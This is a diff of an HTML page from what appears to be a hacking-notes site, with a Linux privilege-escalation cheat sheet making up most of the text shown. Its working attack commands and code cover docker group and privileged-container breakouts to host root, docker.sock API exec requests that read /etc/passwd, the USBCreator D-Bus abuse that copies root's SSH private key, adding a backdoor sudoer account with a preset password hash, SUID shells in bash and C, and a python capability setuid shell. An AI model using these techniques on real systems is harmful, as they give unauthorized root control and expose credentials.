+  <p><strong>Hint</strong>: Files owned by root are now writable such as <code class="highlighter-rouge">/etc/passwd</code> or <code class="highlighter-rouge">/etc/shadow</code>.</p>
+</blockquote>
+
+<h2 id="video">video</h2>
+
+<p>The video group has access to view the screen output of all opened sessions (tty). With <code class="highlighter-rouge">w</code> command we can see the who is logged on the server:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>moshe@falafel:/var/log<span class="nv">$ </span>w
+ 17:35:42 up  3:40,  3 <span class="nb">users</span>,  load average: 0.22, 0.09, 0.08
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-yossi    tty1                      13:55    3:40m  0.05s  0.04s -bash
+yossi    tty1                      13:55    3:40m  0.05s  0.04s <span class="nt">-bash</span>
 moshe    pts/0    10.10.14.20      17:18    0.00s  0.08s  0.00s w
-moshe    pts/1    10.10.14.20      17:18   15:17   0.03s  0.03s bash</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-So we need to grab the video output and graphics configuration.
-
+moshe    pts/1    10.10.14.20      17:18   15:17   0.03s  0.03s bash
 </code></pre></div></div>
-<p>moshe@falafel:/var/log$ cat /dev/fb0 &gt; /tmp/screen.raw
-moshe@falafel:/var/log$ cat /sys/class/graphics/fb0/virtual_size
-1176,885</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-Finally we can open the data with GIMP.
 
-![](/hackingnotes/images/video.png)
+<p>So we need to grab the video output and graphics configuration.</p>
 
-## docker
-
-Since we are member of docker group, we can mount the root filesystem of the host machine to an instance's volume.
-
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>moshe@falafel:/var/log<span class="nv">$ </span><span class="nb">cat</span> /dev/fb0 <span class="o">&gt;</span> /tmp/screen.raw
+moshe@falafel:/var/log<span class="nv">$ </span><span class="nb">cat</span> /sys/class/graphics/fb0/virtual_size
+1176,885
 </code></pre></div></div>
-<p>$ docker image ls
-REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+
+<p>Finally we can open the data with GIMP.</p>
+
+<p><img src="/hackingnotes/images/video.png" alt="" /></p>
+
+<h2 id="docker">docker</h2>
+
+<p>Since we are member of docker group, we can mount the root filesystem of the host machine to an instance’s volume.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>docker image <span class="nb">ls
+</span>REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
 ubuntu              latest              775349758637        22 months ago       64.2MB
 alpine              latest              965ea09ff2eb        22 months ago       5.55MB
-centos              latest              0f3e07c0138f        23 months ago       220MB</p>
+centos              latest              0f3e07c0138f        23 months ago       220MB
 
-<p>$ docker run -it –rm -v /:/mnt <imagename> chroot /mnt bash</imagename></p>
+<span class="nv">$ </span>docker run <span class="nt">-it</span> <span class="nt">--rm</span> <span class="nt">-v</span> /:/mnt &lt;imagename&gt; <span class="nb">chroot</span> /mnt bash
 
-<h1 id="edit-etcpasswd-to-get-root-access-to-the-host">Edit /etc/passwd to get root access to the host</h1>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-We can also mount the filesystem and the network access.
-
+<span class="c"># Edit /etc/passwd to get root access to the host</span>
 </code></pre></div></div>
-<p>$ docker run –rm -it –pid=host –net=host –privileged -v /:/mnt <imagename> chroot /mnt bashbash</imagename></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-# Docker Breakout
 
-## Privileged Flag enabled
+<p>We can also mount the filesystem and the network access.</p>
 
-When we start a docker with the privileged flag `--privileged` , we give the sufficient permission to mount the host filesystem inside the docker.
-
-When the `root` user is owned, we will search the host drive:
-
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt &lt;imagename&gt; chroot /mnt bashbash
 </code></pre></div></div>
-<p>fdisk -l</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-After finding the Linux sda we will mount it:
 
+<h1 id="docker-breakout">Docker Breakout</h1>
+
+<h2 id="privileged-flag-enabled">Privileged Flag enabled</h2>
+
+<p>When we start a docker with the privileged flag <code class="highlighter-rouge">--privileged</code> , we give the sufficient permission to mount the host filesystem inside the docker.</p>
+
+<p>When the <code class="highlighter-rouge">root</code> user is owned, we will search the host drive:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fdisk <span class="nt">-l</span>
 </code></pre></div></div>
-<p>mkdir -p /mnt/host_drive
-mount /dev/sda1 /mnt/host_drive</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-Finally, just `cd` to out new mount point to find all host files.
 
-## Docker.sock available
+<p>After finding the Linux sda we will mount it:</p>
 
-By default, when the `docker` command is executed on a host, an API call to the docker daemon is made via a non-networked UNIX socket located at `/var/run/docker.sock`. However, many containers and guides require you to expose this socket file as a volume within a container or in some cases, expose it on a TCP port. Docker containers that expose `/var/run/docker.sock`, locally or remotely, could lead to a full environment take over.
-
-### Check if socket is available
-
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="nt">-p</span> /mnt/host_drive
+mount /dev/sda1 /mnt/host_drive
 </code></pre></div></div>
-<p>ls -alh /var/run/docker.sock</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-### List all containers
 
+<p>Finally, just <code class="highlighter-rouge">cd</code> to out new mount point to find all host files.</p>
+
+<h2 id="dockersock-available">Docker.sock available</h2>
+
+<p>By default, when the <code class="highlighter-rouge">docker</code> command is executed on a host, an API call to the docker daemon is made via a non-networked UNIX socket located at <code class="highlighter-rouge">/var/run/docker.sock</code>. However, many containers and guides require you to expose this socket file as a volume within a container or in some cases, expose it on a TCP port. Docker containers that expose <code class="highlighter-rouge">/var/run/docker.sock</code>, locally or remotely, could lead to a full environment take over.</p>
+
+<h3 id="check-if-socket-is-available">Check if socket is available</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-alh</span> /var/run/docker.sock
 </code></pre></div></div>
-<p>curl -ik –unix-socket /var/run/docker.sock http://<docker_host>:PORT/containers/json</docker_host></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-### Create an exec
 
+<h3 id="list-all-containers">List all containers</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ik</span> <span class="nt">--unix-socket</span> /var/run/docker.sock http://&lt;docker_host&gt;:PORT/containers/json
 </code></pre></div></div>
-<p>curl -ik -X POST –unix-socket /var/run/docker.sock -H “Content-Type: application/json” –data-binary ‘{“AttachStdin”: true,”AttachStdout”: true,”AttachStderr”: true,”Cmd”: [“cat”, “/etc/passwd”],”DetachKeys”: “ctrl-p,ctrl-q”,”Privileged”: true,”Tty”: true}’ http://<docker_host>:PORT/containers/<container_id>/exec</container_id></docker_host></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-### Start the exec
 
+<h3 id="create-an-exec">Create an exec</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ik</span> <span class="nt">-X</span> POST <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data-binary</span> <span class="s1">'{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}'</span> http://&lt;docker_host&gt;:PORT/containers/&lt;container_id&gt;/exec
 </code></pre></div></div>
-<p>curl -ik -X POST –unix-socket /var/run/docker.sock -H “Content-Type: application/json” –data-binary ‘{“Detach”: false,”Tty”: true} http://<docker_host>:PORT/exec/<exec_id>/start'</exec_id></docker_host></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-* [https://dejandayoff.com/the-danger-of-exposing-docker.sock/](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)
 
-# USBCreator D-Bus
+<h3 id="start-the-exec">Start the exec</h3>
 
-A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the **sudoer group to bypass the password** security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – **without supplying a password.**
-
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ik</span> <span class="nt">-X</span> POST <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data-binary</span> <span class="s1">'{"Detach": false,"Tty": true} http://&lt;docker_host&gt;:PORT/exec/&lt;exec_id&gt;/start'</span> 
 </code></pre></div></div>
-<p>gdbus call –system –dest com.ubuntu.USBCreator –object-path /com/ubuntu/USBCreator –method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /id_rsa true</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
-# Executing files with root
+<ul>
+  <li><a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/">https://dejandayoff.com/the-danger-of-exposing-docker.sock/</a></li>
+</ul>
 
-## Adding a new SUDOER user (Bash)
+<h1 id="usbcreator-d-bus">USBCreator D-Bus</h1>
 
-We can create a new user and add it to the sudoers file:
+<p>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the <strong>sudoer group to bypass the password</strong> security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – <strong>without supplying a password.</strong></p>
 
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdbus call <span class="nt">--system</span> <span class="nt">--dest</span> com.ubuntu.USBCreator <span class="nt">--object-path</span> /com/ubuntu/USBCreator <span class="nt">--method</span> com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /id_rsa <span class="nb">true</span>
 </code></pre></div></div>
-<p>#!/bin/bash</p>
 
-<p>useradd dirty_sock -m -p ‘$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.’ -s /bin/bash
-usermod -aG sudo dirty_sock
-echo “dirty_sock    ALL=(ALL:ALL) ALL” » /etc/sudoers</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-## Creating a SUID shell (bash)
+<ul>
+  <li><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a></li>
+</ul>
 
-We can copy the bash file to temp and give it SUID permissions.
+<h1 id="executing-files-with-root">Executing files with root</h1>
 
+<h2 id="adding-a-new-sudoer-user-bash">Adding a new SUDOER user (Bash)</h2>
+
+<p>We can create a new user and add it to the sudoers file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+useradd dirty_sock <span class="nt">-m</span> <span class="nt">-p</span> <span class="s1">'$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.'</span> <span class="nt">-s</span> /bin/bash
+usermod <span class="nt">-aG</span> <span class="nb">sudo </span>dirty_sock
+<span class="nb">echo</span> <span class="s2">"dirty_sock    ALL=(ALL:ALL) ALL"</span> <span class="o">&gt;&gt;</span> /etc/sudoers
 </code></pre></div></div>
-<p>cp /bin/bash /tmp/bash
-chmod u+s /tmp/bash</p>
 
-<p>/tmp/bash -p</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-## Creating a SUID file (c)
+<h2 id="creating-a-suid-shell-bash">Creating a SUID shell (bash)</h2>
 
+<p>We can copy the bash file to temp and give it SUID permissions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /bin/bash /tmp/bash
+<span class="nb">chmod </span>u+s /tmp/bash
+
+/tmp/bash <span class="nt">-p</span>
 </code></pre></div></div>
-<p>#include <unistd.h>
-int main()
-{
-    setreuid(0,0);
-    execl("/bin/bash", "bash", (char *)NULL);
-    return 0;
-}</unistd.h></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-## Creating a SUID shell (C)
 
-We can write the following C code in order to obtain a bash shell:
+<h2 id="creating-a-suid-file-c">Creating a SUID file (c)</h2>
 
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt;
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">setreuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">execl</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="s">"bash"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div></div>
-<p>#include <stdio.h>
-#include <unistd.h></unistd.h></stdio.h></p>
 
-<p>int main (void) {
-    char *argv[] = { “/bin/bash”, “-p”, NULL };
-    execve(argv[0], argv, NULL);
-}</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-We just need to compile and give SUID permissions from root in our attacking machine.
+<h2 id="creating-a-suid-shell-c">Creating a SUID shell (C)</h2>
 
+<p>We can write the following C code in order to obtain a bash shell:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"/bin/bash"</span><span class="p">,</span> <span class="s">"-p"</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
+    <span class="n">execve</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
 </code></pre></div></div>
-<p>gcc -m32 shell.c -o shell
-root@kali $ chmod +s shell</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-Finally we need to transfer the file with the command execution.
 
+<p>We just need to compile and give SUID permissions from root in our attacking machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-m32</span> shell.c <span class="nt">-o</span> shell
+root@kali <span class="nv">$ </span><span class="nb">chmod</span> +s shell
 </code></pre></div></div>
-<p>/tmp/shell -p</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-# Capabilities
 
-Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.
+<p>Finally we need to transfer the file with the command execution.</p>
 
-Search files with capabilities:
-
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tmp/shell <span class="nt">-p</span>
 </code></pre></div></div>
-<p>getcap -r / 2&gt;/dev/null</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-## Python Capability
 
+<h1 id="capabilities">Capabilities</h1>
+
+<p>Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.</p>
+
+<p>Search files with capabilities:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getcap <span class="nt">-r</span> / 2&gt;/dev/null
 </code></pre></div></div>
-<p>python3 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’
-```</p>
+
+<h2 id="python-capability">Python Capability</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+</code></pre></div></div>
 
 <h1 id="references">References:</h1>
 
